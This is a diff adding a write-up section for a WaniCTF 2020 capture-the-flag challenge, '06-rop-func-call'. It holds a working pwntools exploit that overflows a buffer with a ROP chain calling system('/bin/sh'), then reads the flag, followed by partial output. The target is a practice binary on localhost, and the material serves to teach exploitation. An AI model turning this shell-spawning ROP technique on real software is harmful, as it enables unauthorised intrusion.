@@ -539,3 +539,65 @@ io.sendlineafter(b"What's your name?: ", flat(b"A"*14, b"B"*8, rop))
 io.sendlineafter(b"congratulation!", b"cat flag.txt")
 io.interactive()
 ```
+
+## 06-rop-func-call
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/06-rop-func-call
+
+```python
+#!/usr/bin/env python3
+from time import sleep
+
+from pwn import ELF, ROP, args, asm, context, flat, log, process, remote
+from pwnlib import gdb
+
+context.log_level = "info"
+exe = context.binary = ELF("file/pwn06", checksec=False)
+if args.GDB:
+    io = gdb.debug(exe.path, gdbscript="b vuln\nc")
+elif args.REMOTE:
+    io = remote("::1", 9006)
+else:
+    io = process(exe.path)
+rop = ROP(exe)
+# ------------------------------------------------------------------------
+# # system("/bin/sh")
+# rop.raw(0x000000000040065e)  # ret;
+# rop.raw(0x0000000000400a53)  # pop rdi; ret;
+# rop.raw(0x0000000000601080)  # 601080 2f62696e 2f736800 : /bin/sh.
+# rop.raw(0x00000000004006c0)  # <system@plt>
+# ------------------------------------------------------------------------
+# # system("/bin/sh")
+# rop.raw(next(exe.search(asm("ret"), executable=True)))
+# rop.raw(next(exe.search(asm("pop rdi; ret"), executable=True)))
+# rop.raw(next(exe.search(b"/bin/sh\x00")))
+# rop.raw(exe.plt.system)
+# ------------------------------------------------------------------------
+# # system("/bin/sh")
+rop.raw(rop.ret)
+rop.call(exe.plt.system, [next(exe.search(b"/bin/sh\x00"))])
+# ------------------------------------------------------------------------
+log.info("ROP:\n%s", rop.dump())
+io.sendlineafter(b": ", flat(b"A"*0xe, b"B"*0x8, rop.chain()))
+io.recvuntil(b"***start stack dump***")
+log.info("%s", io.recvuntil(b"***end stack dump***", drop=False).decode())
+sleep(1)
+io.sendline(b"cat flag.txt")
+io.recvuntil(b"FLAG{")
+log.success("FLAG{%s", io.recvuntil(b"}").decode())
+io.close()
+```
+
+### Answer
+
+```zsh
+[+] Opening connection to ::1 on port 9006: Done
+[*] Loaded 14 cached gadgets for 'file/pwn06'
+[*] ROP:
+    0x0000:         0x40065e ret
+    0x0008:         0x400a53 pop rdi; ret
+    0x0010:         0x601080 [arg0] rdi = binsh
+    0x0018:         0x4006c0
+ (snip)
+```
+
